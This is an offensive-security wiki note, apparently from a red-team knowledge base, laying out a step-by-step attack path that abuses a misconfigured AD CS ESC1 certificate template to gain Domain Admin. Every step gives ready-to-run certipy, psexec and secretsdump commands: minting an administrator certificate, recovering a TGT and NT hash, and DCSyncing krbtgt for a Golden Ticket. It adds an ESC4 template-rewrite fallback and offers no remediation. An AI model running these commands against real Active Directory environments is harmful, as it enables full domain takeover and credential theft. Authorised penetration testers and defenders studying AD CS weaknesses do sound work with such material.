---
title: "Attack Path: Enrollment Rights on ESC1 Template → Domain Admin Cert"
type: note
created: 2026-06-13
updated: 2026-06-13
tags: [attack-path, active-directory, ad-cs, privilege-escalation]
---

# Attack Path: Enrollment Rights on ESC1 Template → Domain Admin Cert

The fastest domain-dominance path when AD CS is in scope: any authenticated
user with enrollment rights on a misconfigured template can mint a
certificate that authenticates as Domain Admin, with zero ACL abuse or
lateral movement needed first.

## Chain

```
You (any domain user, enrollment rights on Template X)
  --certipy find -vulnerable--> Template X is ESC1 (enrollee-supplies-subject + client auth EKU)
  --certipy req -upn administrator@corp.local--> cert for "Administrator"
  --certipy auth--> TGT + NT hash for Administrator
  --DCSync / psexec--> Domain Admin everywhere
```

## Step 1 — Enumerate the CA and templates
```bash
certipy find -u user@corp.local -p password -dc-ip <dc-ip> -vulnerable -stdout
```
Look for a template flagged `ESC1` in the output: `ENROLLEE_SUPPLIES_SUBJECT`
set, `Client Authentication`/`Smart Card Logon` in the EKU, manager approval
not required, and `Domain Users` (or a group you're in) has enrollment
rights. See [[ad-cs-esc-attacks]].

## Step 2 — Request a certificate as Administrator
```bash
certipy req -u user@corp.local -p password -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local
```
This produces `administrator.pfx` — a valid certificate whose subject claims
to be the domain Administrator, issued by your own legitimate (if
over-permissive) CA.

## Step 3 — Authenticate with the cert
```bash
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip <dc-ip>
```
This performs PKINIT (see [[pkinit-unpac-the-hash]]) and returns both a TGT
for Administrator and, via UnPAC the hash, the Administrator NT hash
directly — no need to touch LSASS anywhere.

## Step 4 — Use the access
```bash
# Either inject the TGT and go
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@dc01.corp.local

# Or DCSync with the recovered NT hash for a durable Golden Ticket
secretsdump.py -hashes :<administrator_nthash> corp.local/administrator@dc01.corp.local -just-dc-user krbtgt
```
See [[dcsync]], [[golden-silver-tickets]].

## If the template itself isn't vulnerable but you have write access to it
Pivot to ESC4 — use [[acl-abuse]] (WriteDacl/WriteOwner/WriteProperty on the
template object) to rewrite it into an ESC1-vulnerable config, exploit as
above, then restore the original config. See [[ad-cs-esc-attacks]] ESC4.

## Related
- [[ad-cs-esc-attacks]] — full ESC1-15 taxonomy and per-ESC commands
- [[pkinit-unpac-the-hash]] — cert → TGT + NT hash mechanism (step 3)
- [[acl-abuse]] — ESC4 fallback if no template is directly vulnerable
- [[dcsync]], [[golden-silver-tickets]] — step 4, durable persistence
- [[esc8-ntlm-relay-adcs]] — alternative AD CS path when you hold no creds at all (NTLM relay instead of direct enrollment)
